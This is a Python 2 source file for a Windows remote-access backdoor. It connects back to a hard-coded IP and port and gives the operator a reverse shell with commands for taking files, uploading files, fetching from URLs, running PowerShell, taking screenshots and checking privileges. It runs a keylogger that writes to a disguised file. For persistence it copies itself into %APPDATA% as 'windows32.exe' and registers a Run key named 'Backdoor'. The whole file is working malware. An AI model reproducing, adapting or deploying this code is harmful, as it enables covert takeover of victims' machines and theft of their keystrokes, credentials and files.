#!/usr/bin/python2

import socket 
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests
from mss import mss
import threading
import keylogger

def reliable_sent(data):
    json_data = json.dumps(data)
    sock.send(json_data)

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def is_admin():
    global admin
    try:
        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
    except:
        admin = "[!!] User Privileges!"
    else:
        admin = "[+] Administrator Privileges"


def screenshot():
    with mss() as screenshot:
        screenshot.shot()

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def connection():
    while True:
        time.sleep(20)
        try:
            sock.connect(("192.168.122.234", 54321))
            shell()
        except:
            connection()



def shell():
    while True:
        command = reliable_recv()
        if command == 'q':
            break
        
        elif command == "help":
            help_options = """
                    download <path>       -->     Download a file From Target PC
                    upload   <path>       -->     Upload a file to target PC
                    get      <url>        -->     Download a file to target pc from any website
                    start    <p_name>     -->     Start a Program on Target PC
                    screenshot            -->     Take A Screenshot of Target's Screen
                    check                 -->     Check For Admin Privileges
                    powershell <command>  -->     To run Powershell
                    keylog_start          -->     Start the keylogger
                    keylog_dump           -->     Dump the keystrokes From keylogger
                    q                     -->     Exit The Reverse Shell
            """
            reliable_sent(help_options)

        elif command[:2] == 'cd' and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        
        elif command[:8] == "download":
            with open(command[9:], "rb") as file:
                reliable_sent(base64.b64encode(file.read()))
        
        elif command[:6] == 'upload':
            with open(command[7:], "wb") as fin:
                file_data = reliable_recv()
                fin.write(base64.b64decode(file_data))
        
        elif command[:3] == "get":
            try:
                download(command[4:])
                reliable_sent("[+] Downloaded File From Specified URL!")
            except:
                reliable_sent("[!!] Failed To Download That File")
        
        elif command[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png", "rb") as sc:
                    reliable_sent(base64.b64encode(sc.read()))
                os.remove("monitor-1.png")
            except:
                reliable_sent("[!!] Failed To Take Screenshot")
        
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_sent('[+] Started!')
            except:
                reliable_sent('[!!] Failed To Start!')

        elif command[:10] == 'powershell':
            try:
                subprocess.Popen(command, shell=True)
                reliable_sent('[+] Powershell module started')
            except:
                reliable_sent("[!!] Failed to run Powershell")

        elif command[:5] == "check":
            try:
                is_admin()
                reliable_sent(admin)
            except:
                reliable_sent("Can't Perform The Check")

        elif command[:12] == "keylog_start":
            t1 = threading.Thread(target=keylogger.start)
            t1.start()

        elif command[:11] == "keylog_dump":
            fn = open(keylogger_path, 'r')
            reliable_sent(fn.read())


        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_sent(result)


keylogger_path = os.environ["appdata"] + "\\processmanager.txt"
location = os.environ["appdata"] + "\\windows32.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable, location)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
    



sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# sock.connect(("192.168.122.234", 54321))

connection()
# shell()
sock.close()